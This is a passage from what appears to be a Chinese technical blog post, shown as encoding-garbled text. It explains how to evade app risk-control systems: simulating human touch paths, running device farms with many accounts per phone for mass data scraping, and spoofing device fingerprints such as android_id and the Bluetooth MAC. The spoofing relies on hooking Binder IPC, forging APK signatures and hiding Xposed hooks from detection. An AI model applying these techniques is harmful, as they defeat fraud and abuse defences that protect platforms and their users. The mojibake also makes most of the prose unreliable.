éšæœºè·¯å¾„ä¹Ÿå¾ˆç®€å•ï¼Œåœ¨ä¸å½±å“ç‚¹å‡»ç»“æœçš„æƒ…å†µä¸‹ï¼Œä»¿äººè§¦æ‘¸éšæœºå¯¹å±å¹•æ»‘åŠ¨ã€‚</p><p>ï¼ˆå¯ä»¥æå‰å½•åˆ¶ä¸€äº›ç”¨æˆ·çš„æ“ä½œæµç¨‹ï¼Œå°†æ•°æ®ä¿å­˜åˆ°Jsoné‡Œé¢ï¼Œåœ¨å¯¹å±å¹•è¿›è¡Œdispatchäº‹ä»¶åˆ†å‘çš„æ—¶å€™ï¼Œé‡‡ç”¨çœŸäººç‚¹å‡»çš„eventå³å¯ï¼‰</p><blockquote><p>ç»†èŠ‚ç‚¹ï¼šå¦‚ä½•è®°å½•ç”¨æˆ·çš„ç‚¹å‡»è¡Œä¸ºï¼Ÿ</p><p>æ‰‹æœºå±å¹•å¥½åƒæ˜¯ä¸€ä¸ªåˆ†å‘å™¨ï¼Œè€Œå±å¹•çš„viewæ˜¯æ¶ˆè´¹è€…ã€‚ä»–å¯èƒ½é€‰æ‹©æ¶ˆè´¹è¿™ä¸ªäº‹ä»¶ï¼Œä¹Ÿå¯ä»¥é€‰æ‹©æŠ›å‡ºå»ï¼Œç»™ä¸‹çº§viewå»æ¶ˆè´¹ã€‚</p><p>ä½†æ˜¯äº‹ä»¶åªè¦è¢«æ¶ˆè´¹äº†å°±ä¸€å®šä¼šèµ°<code>view-&gt;ontouch();</code>æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦<code>hook viewçš„view-&gt;ontouch();</code> æ–¹æ³•ï¼ŒæŠŠå‚æ•°1è¿›è¡ŒtoStringæ‰“å°å’Œä¿å­˜å³å¯ã€‚å³å¯å¾—åˆ°å…¨éƒ¨çš„çš„ç‚¹å‡»äº‹ä»¶æ¶ˆè´¹å¯¹è±¡<code>objection</code>ã€‚</p></blockquote><h3 id="å¼‚å¸¸-è¡Œä¸ºåŸ‹ç‚¹"><a href="#å¼‚å¸¸-è¡Œä¸ºåŸ‹ç‚¹" class="headerlink" title="å¼‚å¸¸&amp;è¡Œä¸ºåŸ‹ç‚¹"></a>å¼‚å¸¸&amp;è¡Œä¸ºåŸ‹ç‚¹</h3><h4 id="æ£€æµ‹åŸç†"><a href="#æ£€æµ‹åŸç†" class="headerlink" title="æ£€æµ‹åŸç†"></a>æ£€æµ‹åŸç†</h4><p>æŒ‡çš„æ˜¯åœ¨æŸä¸ªé¡µé¢è¿›è¡ŒåŸ‹ç‚¹ï¼Œåªæœ‰è§¦å‘æŸæ¡è¯·æ±‚æˆ–è€…æ‰“å¼€æŸä¸ªé¡µé¢çš„æ—¶å€™æ‰ä¼šè¿›è¡ŒåŸ‹ç‚¹ä¸ŠæŠ¥ã€‚</p><blockquote><p><strong>ä¸¾ä¸ªcase:</strong></p><p>å½“æ”»å‡»è€…è°ƒç”¨ç™»å…¥æ¥å£è·å–tokençš„æ—¶å€™ï¼Œæ­£å¸¸è‚¯å®šéœ€è¦æ‰“å¼€Appçš„ç™»å…¥é¡µé¢ï¼Œè€Œè¿™ä¸ªåŸ‹ç‚¹æ˜¯é€šè¿‡æ‰“å¼€é¡µé¢æ—¶å€™è¿›è¡Œä¸ŠæŠ¥ã€‚</p><p><strong>å¦‚æœæ”»å‡»è€…åªè¿›è¡Œäº†è°ƒç”¨ç™»å…¥æ¥å£ï¼Œæ²¡æœ‰è°ƒç”¨åŸ‹ç‚¹æ¥å£ï¼Œå¯èƒ½ä¼šå¯¼è‡´å½“å‰è¯·æ±‚ç¼ºå°‘å‰ç½®åŸ‹ç‚¹ã€‚</strong>å¯èƒ½ä¼šå¯¼è‡´æ•°æ®è¢«é£æ§ã€‚</p></blockquote><p>åŸ‹ç‚¹ä¸ŠæŠ¥å…¶å®åœ¨é£æ§é‡Œé¢å‘æŒ¥çš„ä½œç”¨è¿˜æ˜¯å¾ˆå¤§çš„ï¼Œæ­£å¸¸ç”¨æˆ·ä»ç™»å…¥åˆ°æŸ¥çœ‹ä¸ªäººä¿¡æ¯ï¼Œéœ€è¦è§¦å‘5ä¸ªåŸ‹ç‚¹ä¿¡æ¯ã€‚</p><p>ä½†æ˜¯æ”»å‡»è€…åªè§¦å‘äº†1-2ä¸ªåŸ‹ç‚¹ï¼Œåˆ™å¯è®¤å®šå½“å‰ç”¨æˆ·å­˜åœ¨ä½œå¼Šè¡Œä¸ºï¼Œå¯èƒ½å­˜åœ¨è„±æœºçš„å«Œç–‘ã€‚ä¼šè¢«ç›´æ¥æ ‡è¯†æˆé»‘è®¾å¤‡ã€‚</p><p>åœ¨åå°çœ‹çš„è¯å°±æ˜¯ä¸€äº›ç‚¹ç‚¹ï¼Œè€Œè¿™äº›ç‚¹å°±æ˜¯ä¸åŒçš„åŸ‹ç‚¹ä¿¡æ¯ï¼Œå“ªä¸ªç‚¹è¢«ç‚¹äº®ï¼Œå“ªä¸ªç‚¹æ²¡æœ‰è¢«ç‚¹äº®ï¼Œå’Œæ­£å¸¸çš„ç”¨æˆ·åšä¸€ä¸‹å¯¹æ¯”ï¼Œå¾ˆå®¹æ˜“å°±å¯ä»¥ç¡®è®¤ã€‚</p><h4 id="å¯¹æŠ—åŸç†ï¼š"><a href="#å¯¹æŠ—åŸç†ï¼š" class="headerlink" title="å¯¹æŠ—åŸç†ï¼š"></a>å¯¹æŠ—åŸç†ï¼š</h4><p>åŒä¸Š</p><h3 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h3><p>è¯´äº†è¿™ä¹ˆå¤šæ€»ç»“ä¸€ä¸‹ï¼Œç”¨ä¸Šè¿°çš„æ–¹æ³•å¯ä»¥æœ‰æ•ˆå¯¹æŠ—ï¼ŒRPCï¼Œæˆ–è€…å¸¸è§„çš„è‡ªåŠ¨ç‚¹å‡»ï¼ŒåŒ…æ‹¬ä¸€äº›å¤§æ‰¹é‡çš„æ•°æ®è·å–ã€‚</p><p>å½“è´¦å·æ•°é‡è¶³å¤Ÿå¤šçš„æ—¶å€™ï¼ˆè´¦å·è¶³å¤Ÿæˆç†Ÿï¼Œå¾ˆå¤šæ–°å·ä¼šæœ‰é™åˆ¶ï¼‰ï¼Œå¹¶ä¸”æ»¡è¶³ä¸€ä¸‹æ¡ä»¶çš„æ—¶å€™ï¼š</p><p><strong>ç¾¤æ§+è‡ªåŠ¨ç‚¹å‡»+ç”¨æˆ·ç‚¹å‡»éšæœºè·¯å¾„+å®Œå–„çš„æ”¹æœºè½¯ä»¶+ä¸€æœºå¤šå·ï¼ˆè®¾å¤‡å¤Ÿå¤šæ— è§†ï¼‰ï¼Œå³å¯å®ç°é£æ§çš„å¯¹æŠ—ã€‚</strong></p><p>å½“ç„¶è¿˜éœ€è¦åˆ†æï¼Œä¸€äº›è´¦å·çš„ä¸´ç•Œå€¼ï¼Œä¸åŒçš„æ•°æ®å¯èƒ½è§¦å‘çš„é£æ§ç‚¹ä¹Ÿä¸ä¸€æ ·ã€‚</p><p>æ¯”å¦‚æœ‰çš„æ•°æ®å•ç”¨æˆ·æ—¥è·å–é‡ä¸è¶…è¿‡20æ¡ï¼Œé‚£ä¹ˆä½ ä½ å°±ä¸å¯èƒ½è·å–è¶…è¿‡20æ¬¡ã€‚ç¾¤æ§æœåŠ¡ç«¯è¿˜éœ€è¦è®°å½•æ¯ä¸ªç”¨æˆ·çš„æ—¥ç‚¹å‡»æ•°ï¼Œç­‰ä¿¡æ¯ã€‚</p><h1 id="è®¾å¤‡æŒ‡çº¹è·å–"><a href="#è®¾å¤‡æŒ‡çº¹è·å–" class="headerlink" title="è®¾å¤‡æŒ‡çº¹è·å–"></a>è®¾å¤‡æŒ‡çº¹è·å–</h1><h2 id="åŸºæœ¬æ¦‚å¿µ-1"><a href="#åŸºæœ¬æ¦‚å¿µ-1" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h2><h3 id="Android-IPCä»£ç†"><a href="#Android-IPCä»£ç†" class="headerlink" title="Android IPCä»£ç†"></a>Android IPCä»£ç†</h3><p>Androidæœ¬èº«æ˜¯CSæ¶æ„ï¼Œå®¢æˆ·ç«¯ï¼ˆclientï¼‰æœåŠ¡ç«¯ï¼ˆserverï¼‰ï¼Œæˆ‘ä»¬å¸¸ç”¨çš„é€šè¿‡contextä¸Šä¸‹æ–‡è°ƒç”¨çš„APIéƒ½æ˜¯ç›´æ¥è°ƒç”¨ä»£ç†äººçš„æ–¹å¼å»è°ƒç”¨çš„ï¼Œè€ŒçœŸæ­£çš„æœåŠ¡ç«¯æ˜¯ActivityManagerServer ç®€ç§°ï¼ŒAMSï¼Œ ä»–æœ‰å¾ˆå¤šä»£ç†ï¼Œæ¯”å¦‚PackageManagerï¼ŒActivityManager ç­‰ï¼Œè¿™äº›éƒ½æ˜¯AMSçš„<strong>ä»£ç†äºº</strong>ã€‚è€ŒAMSå°±æ˜¯<strong>è¢«ä»£ç†äºº</strong>ã€‚ä»£ç†æ¨¡å¼æ˜¯ä¸€ç§è®¾è®¡æ¨¡å¼ï¼Œä»£ç†äººå¯ä»¥æä¾›è¢«ä»£ç†äººçš„éƒ¨åˆ†æˆ–è€…å…¨éƒ¨åŠŸèƒ½ï¼Œå®ç°ä»£ç å°è£…ï¼Œåšé‰´æƒï¼Œä»£ç å®‰å…¨çš„è§’åº¦ï¼Œä»£ç†æ¨¡å¼å¾ˆå¸¸ç”¨çš„è®¾è®¡æ¨¡å¼ã€‚</p><p>AMSå’Œä»£ç†ä»¬é€šè¿‡Binderè¿›è¡Œé€šè®¯ï¼ŒBinderæ˜¯ä»€ä¹ˆï¼Œæœ‰ä»€ä¹ˆå¥½å¤„è¿™é‡Œå°±ä¸è¯¦ç»†å±•å¼€äº†ï¼Œå®‰å“é¢è¯•å…«è‚¡æ–‡ï¼Œå¯ä»¥ç†è§£æˆ<strong>è¿›ç¨‹é—´é€šè®¯</strong>çš„ä¸œè¥¿ï¼Œåº•å±‚å®ç°æ˜¯<strong>é€šè¿‡å…±äº«å†…å­˜ï¼Œæ•°æ®ä¼ è¾“ï¼Œè¯»å–é€Ÿåº¦æ›´å¿«</strong>ã€‚<strong>å½“æˆ‘ä»¬è°ƒç”¨ä»£ç†äººçš„APIçš„æ—¶å€™ï¼Œæœ¬è´¨ä¸Šæ˜¯é€šè¿‡Binderå»å‘é€ä¸€äº›æ•°æ®åŒ…ï¼Œå’ŒAMSé€šè®¯</strong>ï¼Œå½“<strong>AMSæ”¶åˆ°æ¶ˆæ¯ä»¥åæŠŠç»“æœåœ¨ä¼ è¾“ç»™å¯¹åº”çš„ä»£ç†äºº</strong>ã€‚ç„¶åè¿”å›ç»™è°ƒç”¨æ–¹ã€‚åœ¨æ¯ä¸ªManageré‡Œé¢éƒ½æœ‰ä¸€ä¸ªä»£ç†äºº ã€‚</p><p>ä¹‹å‰å¾ˆä¹…ä¹‹å‰æœ‰ä¸€ç§åŠ¨æ€ä»£ç†çš„æŠ€æœ¯ï¼ŒåŸç†å°±æ˜¯æ›¿æ¢äº†é‡Œé¢çš„ä»£ç†äººï¼Œå› ä¸ºä»£ç†æ˜¯ä¸€ä¸ªæ¥å£ï¼Œç„¶åæˆ‘ä»¬è‡ªå·±é€šè¿‡Proxyè¿™ä¸ªç±»åˆ›å»ºä¸€ä¸ªä»£ç†ï¼Œç„¶ååå°„setå›å»ï¼Œå°±å¯ä»¥å®ç°å¸¸ç”¨çš„APIæ‹¦æˆªå’ŒHookã€‚ç±»ä¼¼VAçš„æ²™ç›’ï¼Œå¯¹å¤šå¼€çš„Appæä¾›ä¸€ä»½è‡ªå·±å®ç°çš„ä»£ç†ï¼Œç„¶åæ§åˆ¶è¿™äº›ä»£ç†çš„è¿”å›å€¼ï¼Œä»¥æ­¤å®ç°æ²™ç›’ç›¸å…³æ“ä½œã€‚è¿˜æœ‰ä¸€ç§æ¯”è¾ƒå¥½çš„è¿‡APKç­¾åçš„æ–¹æ³•å°±æ˜¯ç›´æ¥Hookâ€æ°´ç®¡â€ ä¹Ÿå°±æ˜¯hook binderçš„é€šè®¯çš„æ–¹æ³•ï¼Œå½“æ¥æ”¶åˆ°æŒ‡å®šäº‹ä»¶ä»¥åï¼Œç›´æ¥ä¿®æ”¹å…·ä½“çš„ç»“æœï¼Œä»¥æ­¤å¯¹Javaå±‚è¿›è¡Œå…¨é‡Hook(<strong>binderçš„é€šè®¯æ–¹æ³•è¢«Hookä»¥åï¼Œè°ƒç”¨è€…å’Œä»£ç†äººåªèƒ½æ‹¿åˆ°è¢«ä¿®æ”¹ä»¥åçš„ç»“æœï¼Œä»¥æ­¤å®ç°Javaå±‚çš„å…¨é‡Hook</strong>ï¼Œåé¢å†è®²ç­¾åéªŒè¯çš„æ—¶å€™æˆ‘åœ¨è¯¦ç»†è¯´ã€‚)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">æ­£å¸¸æµç¨‹ï¼šApp â†’ ä»£ç† â†’ Binder â†’ ç³»ç»ŸæœåŠ¡ â†’ è¿”å›çœŸå®ç­¾å</span><br><span class="line">Hookåï¼šApp â†’ ä»£ç† â†’ [è¢«Hookçš„Binder] â†’ ç³»ç»ŸæœåŠ¡ â†’ çœŸå®ç­¾å</span><br><span class="line">                           â†“</span><br><span class="line">                      æ‹¦æˆªå¹¶ä¿®æ”¹ä¸ºä¼ªé€ ç­¾å</span><br><span class="line">                           â†“</span><br><span class="line">         App â† ä»£ç† â† [è¢«Hookçš„Binder] â† ä¼ªé€ ç­¾åè¿”å›</span><br></pre></td></tr></table></figure><h2 id="è®¾å¤‡æŒ‡çº¹-1"><a href="#è®¾å¤‡æŒ‡çº¹-1" class="headerlink" title="è®¾å¤‡æŒ‡çº¹"></a>è®¾å¤‡æŒ‡çº¹</h2><p>è®¾å¤‡æŒ‡çº¹ä¸»è¦åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼Œ<strong>Javaå±‚è®¾å¤‡æŒ‡çº¹ï¼ŒNativeè®¾å¤‡æŒ‡çº¹</strong>ï¼Œpopenæ‰§è¡Œä¸€äº›å‘½ä»¤è·å–è®¾å¤‡ä¿¡æ¯ï¼ŒåŒ…æ‹¬<strong>ä¸€äº›æ ¸å¿ƒçš„è®¾å¤‡æŒ‡çº¹</strong>ã€‚</p><h3 id="Javaå±‚è®¾å¤‡æŒ‡çº¹"><a href="#Javaå±‚è®¾å¤‡æŒ‡çº¹" class="headerlink" title="Javaå±‚è®¾å¤‡æŒ‡çº¹"></a>Javaå±‚è®¾å¤‡æŒ‡çº¹</h3><h4 id="Settingç›¸å…³ï¼ˆé‡è¦ï¼‰"><a href="#Settingç›¸å…³ï¼ˆé‡è¦ï¼‰" class="headerlink" title="Settingç›¸å…³ï¼ˆé‡è¦ï¼‰"></a>Settingç›¸å…³ï¼ˆé‡è¦ï¼‰</h4><h5 id="Get"><a href="#Get" class="headerlink" title="Get:"></a>Get:</h5><p>åœ¨<code>setting</code>é‡Œé¢å¤§å®¶ç»å¸¸é‡åˆ°çš„å¯èƒ½å°±æ˜¯<code>android id</code>çš„è·å–çš„</p><p><code>API</code>å¦‚ä¸‹:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Settings.Secure.getString(context.getContentResolver(),Settings.Secure.ANDROID_ID)</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å…¶å®<code>Setting</code>é‡Œé¢è¿˜æœ‰å¾ˆå¤šåˆ«çš„åŠŸèƒ½ä¸œè¥¿ï¼Œå¸¸è§çš„å°±æ˜¯<code>Settings.Secure</code> å’Œ <code>Settings.Global</code></p><p>åœ¨<code>Settings.Global</code> é‡Œé¢å…¶å®è¿˜æœ‰ä¸€äº›åˆ«çš„å­—æ®µï¼Œå…·ä½“<code>API</code>å¦‚ä¸‹ã€‚è¿™äº›éƒ½æ˜¯ä¸€äº›æ¯”è¾ƒéšè”½çš„è®¾å¤‡æŒ‡çº¹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Settings.Global.getString(context.getContentResolver(),&quot;mi_health_id&quot;)</span><br><span class="line">Settings.Global.getString(context.getContentResolver(),&quot;mi_health_id&quot;)</span><br><span class="line">Settings.Global.getString(context.getContentResolver(),&quot;gcbooster_uuid&quot;)</span><br><span class="line">Settings.Global.getString(context.getContentResolver(),&quot;key_mqs_uuid&quot;)</span><br><span class="line">Settings.Global.getString(context.getContentResolver(),&quot;ad_aaid&quot;)</span><br></pre></td></tr></table></figure><h5 id="Mock"><a href="#Mock" class="headerlink" title="Mock:"></a>Mock:</h5><p><strong>æ–¹æ³•Hook</strong></p><p><code>Global</code>å’Œ<code>Secure</code> éƒ½æ˜¯å®ç°çš„<code>NameValueTable</code>æ¥å£ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public static String getString(ContentResolver resolver, String name) &#123;</span><br><span class="line">      return getStringForUser(resolver, name, resolver.getUserId());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åº•å±‚è°ƒç”¨çš„æ˜¯<code>getStringForUser(resolver, name, resolver.getUserId())</code> ä¸‰ä¸ªå‚æ•°ï¼Œå¦‚æœHookçš„è¯å¯ä»¥å¯¹è¿™ä¸ªæ–¹æ³•è¿›è¡Œå…¥æ‰‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Settings.Secure-&gt;getStringForUser &amp; Settings.Global-&gt;getStringForUser</span><br></pre></td></tr></table></figure><p><strong>å†…å­˜åå°„</strong></p><p>å¾ˆå¤šå¼€å‘è€…ä¼šé‡‡ç”¨å†…å­˜åå°„çš„æ–¹å¼å»è·å–å˜é‡ï¼Œæ‰€ä»¥ä»…ä»…æ˜¯é€šè¿‡<code>mock</code>æ–¹æ³•çš„æ–¹å¼ä¸å¤Ÿï¼Œå¦‚æœè¿›è¡ŒMockéœ€è¦å°†<code>Settings.Secure</code> å’Œ <code>Settings.Global</code> é‡Œé¢çš„å†…å­˜å˜é‡è¿›è¡Œä¿®å¤ï¼Œ<code>Settings.Global</code>æ˜¯æ”¾äº†ä¸€äº›å…¨å±€å˜é‡ï¼Œ<code>Settings.Secure</code>æ”¾ä¸€äº›å®‰å…¨ç›¸å…³</p><p><code>Settings.Secure-&gt;getStringForUser Settings.Global-&gt;getStringForUser</code> å’Œ å…·ä½“æ–¹æ³•å¦‚ä¸‹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">private static final HashSet&lt;String&gt; MOVED_TO_GLOBAL;</span><br><span class="line">private static final NameValueCache sNameValueCache = new NameValueCache(</span><br><span class="line">                CONTENT_URI,</span><br><span class="line">                CALL_METHOD_GET_SYSTEM,</span><br><span class="line">                CALL_METHOD_PUT_SYSTEM,</span><br><span class="line">                sProviderHolder,</span><br><span class="line">                System.class);</span><br><span class="line">                 </span><br><span class="line">public static String getStringForUser(ContentResolver resolver, String name,</span><br><span class="line">                int userHandle) &#123;</span><br><span class="line">            if (MOVED_TO_GLOBAL.contains(name)) &#123;</span><br><span class="line">                Log.w(TAG, &quot;Setting &quot; + name + &quot; has moved from android.provider.Settings.Secure&quot;</span><br><span class="line">                        + &quot; to android.provider.Settings.Global.&quot;);</span><br><span class="line">                return Global.getStringForUser(resolver, name, userHandle);</span><br><span class="line">            &#125;</span><br><span class="line">            ...</span><br><span class="line">            return sNameValueCache.getStringForUser(resolver, name, userHandle);</span><br><span class="line">       &#125;</span><br><span class="line">                 </span><br><span class="line">                 </span><br><span class="line">@UnsupportedAppUsage</span><br><span class="line">public static String getStringForUser(ContentResolver resolver, String name,</span><br><span class="line">                int userHandle) &#123;</span><br><span class="line">            if (MOVED_TO_SECURE.contains(name)) &#123;</span><br><span class="line">                Log.w(TAG, &quot;Setting &quot; + name + &quot; has moved from android.provider.Settings.System&quot;</span><br><span class="line">                        + &quot; to android.provider.Settings.Secure, returning read-only value.&quot;);</span><br><span class="line">                return Secure.getStringForUser(resolver, name, userHandle);</span><br><span class="line">            &#125;</span><br><span class="line">            if (MOVED_TO_GLOBAL.contains(name) || MOVED_TO_SECURE_THEN_GLOBAL.contains(name)) &#123;</span><br><span class="line">                Log.w(TAG, &quot;Setting &quot; + name + &quot; has moved from android.provider.Settings.System&quot;</span><br><span class="line">                        + &quot; to android.provider.Settings.Global, returning read-only value.&quot;);</span><br><span class="line">                return Global.getStringForUser(resolver, name, userHandle);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œ<strong>æ•´ä½“çš„cacheéƒ½æ˜¯æ”¾åœ¨sNameValueCacheå˜é‡å’ŒMOVED_TO_GLOBALå˜é‡å†…éƒ¨è¿›è¡Œå­˜å‚¨ ã€‚</strong></p><p>æˆ‘ä»¬å¯ä»¥ç›´æ¥åå°„<code>MOVED_TO_GLOBAL</code>è¿™ä¸ª<code>HashSet</code>æˆ–è€…å»<code>sNameValueCache</code> è¿™ä¸ªå˜é‡ç„¶åå»è·å–è¿™ä¸ªå€¼çš„è¯ï¼Œä¹Ÿæ˜¯å¾ˆå®¹æ˜“å¯ä»¥æ‹¿åˆ°æœ€çœŸå®çš„å€¼çš„ã€‚æ‰€ä»¥å…‰<code>mock</code>æ˜¯ä¸å¤Ÿçš„ã€‚</p><p>æ¯”å¦‚å¾ˆå¤šå¤§å‚å°±æ˜¯<strong>Androidé«˜ç‰ˆæœ¬ç»•è¿‡äº†åå°„é™åˆ¶ä»¥åï¼Œæˆ–è€…åˆ¤æ–­å½“å‰æ‰‹æœºæ²¡æœ‰APIåå°„é™åˆ¶ä»¥åç›´æ¥é€šè¿‡åå°„å˜é‡çš„æ–¹å¼å»è·å–ã€‚</strong></p><p><code>sNameValueCache</code>åœ¨é«˜ç‰ˆæœ¬æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œä½ç‰ˆæœ¬å®‰å“ä»–æ˜¯ä¸€ä¸ª<code>ArrayMap</code> è¿™å—éœ€è¦æ³¨æ„ã€‚</p><p><code>sNameValueCache</code>ä¿®æ”¹çš„è¯å¯ä»¥è°ƒç”¨<code>API putStringForUser</code>  å¾€é‡Œé¢å¼ºåˆ¶èµ‹å€¼ã€‚è¿™ä¹ˆä¸€æ¥ä¸‹æ¬¡å¯¹æ–¹åœ¨é€šè¿‡<code>API</code>å»è°ƒç”¨çš„æ—¶å€™å°±ä¼šæ‹¿åˆ°ä½ å·²ç»è¿›è¡Œè¿‡<code>Mock</code>çš„å€¼ã€‚æ‰€ä»¥ä½ ä¿®æ”¹çš„æ—¶å€™éœ€è¦è¿›è¡Œåˆ¤æ–­ï¼Œå½“å‰è·å–çš„å€¼æ˜¯å¦æ˜¯ä½ å·²ç»<code>Mock</code>è¿‡çš„ã€‚</p><h4 id="è“ç‰™ç½‘å¡MACï¼ˆæ™®é€šï¼‰"><a href="#è“ç‰™ç½‘å¡MACï¼ˆæ™®é€šï¼‰" class="headerlink" title="è“ç‰™ç½‘å¡MACï¼ˆæ™®é€šï¼‰"></a>è“ç‰™ç½‘å¡MACï¼ˆæ™®é€šï¼‰</h4><p>è“ç‰™çš„ç½‘å¡ä¸æ˜¯æ™®é€šçš„ç½‘å¡ï¼Œåé¢ä¼šä»‹ç»netlinkerè·å–çœŸå®çš„ç½‘å¡ã€‚</p><h5 id="Get-1"><a href="#Get-1" class="headerlink" title="Get:"></a>Get:</h5><p>ä¸»è¦æ–¹æ³•å°±æ˜¯é€šè¿‡BluetoothAdapter-&gt;getAddress</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">getAddress</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> mManagerService.getAddress(mAttributionSource);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">        Log.e(TAG, <span class="string">&quot;&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">åº”ç”¨è¿›ç¨‹ â†’ Binder Proxy â†’ Binder é©±åŠ¨ â†’ Binder Stub â†’ system_server (å®é™…æœåŠ¡)</span><br></pre></td></tr></table></figure><h5 id="Mockï¼š"><a href="#Mockï¼š" class="headerlink" title="Mockï¼š"></a>Mockï¼š</h5><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªæ–¹æ³•ä¸»è¦æ˜¯é€šè¿‡<code>IPC</code>çš„ä»£ç†ç±»æ–¹å¼å»è·å–çš„ã€‚<strong>æ‰€ä»¥Hookçš„è¯å°½å¯èƒ½å…ˆHookä»£ç†çš„IPCç±»ã€‚å…ˆå°è¯•åå°„ android.bluetooth.IBluetooth$Stub$Proxyç„¶åHook IPCé‡Œé¢çš„getAddress è€Œä¸æ˜¯ç›´æ¥HookBluetoothAdapter-&gt;getAddress</strong></p><p>å› ä¸ºå¾ˆå¤šå¤§å‚è·å–è®¾å¤‡çš„æŒ‡çº¹çš„æ—¶å€™ä¼šæ£€æµ‹è¿™ä¸ªæ–¹æ³•æ˜¯å¦è¢«Hookï¼Œæ£€æµ‹ä¹Ÿå¾ˆç®€å•ï¼Œåªéœ€è¦è·å–è¿™ä¸ª<code>artmethod</code>ç»“æ„ä½“ä»¥å</p><p>åˆ¤æ–­è¿™ä¸ªæ–¹æ³•å…¥å£æ˜¯å¦è¢«æ›¿æ¢ï¼Œæ¯”å¦‚Sandhookä¹‹ç±»çš„å¸¸ç”¨çš„Hookæ¡†æ¶ï¼Œä½ç‰ˆæœ¬é‡‡ç”¨çš„æ˜¯inlinehookå½¢å¼ï¼Œåœ¨é«˜ç‰ˆæœ¬é‡Œé¢é‡‡ç”¨çš„æ˜¯å…¥å£æ›¿æ¢ï¼Œå¯ä»¥ç›´æ¥è·å–åˆ°æ–¹æ³•çš„å…¥å£çš„å‡½æ•°åœ°å€ï¼Œåˆ¤æ–­ä¸€ä¸‹å‡½æ•°æ‰€åœ¨çš„soå³å¯ã€‚æ‰€ä»¥å°½å¯èƒ½HookIPCçš„æ–¹æ³•ã€‚<strong>å¦‚æœç”¨XPosedå»ä¿®æ”¹çš„è¯ï¼Œè¿˜éœ€è¦æ³¨æ„é­”æ”¹ï¼Œå¦åˆ™å¤§å‚ä¼šé€šè¿‡XposedHelpers-&gt;sHookedMethodCallbackså˜é‡æŠŠä½ Hookçš„æ–¹æ³•è¿›è¡Œä¸ŠæŠ¥</strong>ã€‚</p><blockquote><p>å°æŠ€å·§ï¼šè¿™ä¸ªå˜é‡æ˜¯ä¸€ä¸ªé™æ€å˜é‡ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æ‹¿åˆ°XposedHelpersè¿™ä¸ªclasså³å¯ã€‚æƒ³è¦æ‹¿åˆ°classå¿…é¡»å…ˆæ‹¿åˆ°è¿™ä¸ªç±»çš„classloaderï¼Œæ­£å¸¸çš„Xposedæ˜¯é€šè¿‡ç³»ç»Ÿçš„classloaderä½œä¸ºçˆ¶ç±»classloaderï¼Œä½†æ˜¯edxpè¿™ç§ï¼Œæ˜¯ä¸€ä¸ªæ–¹æ³•å†…éƒ¨çš„æˆå‘˜å˜é‡ï¼Œæ²¡æœ‰ä»»ä½•åœ°æ–¹å¼•ç”¨è¿™ä¸ªclassloaderï¼Œæ‰€ä»¥æƒ³æ‹¿åˆ°è¿™ä¸ªclassloaderéœ€è¦ç”¨åˆ°å†…å­˜æ¼«æ¸¸ã€‚æŠŠå†…å­˜å…¨éƒ¨çš„classloaderéƒ½ä»å†…å­˜æŠ å‡ºæ¥ï¼Œç„¶åæŒ¨ä¸ªå»åå°„è·å–XposedHelpers 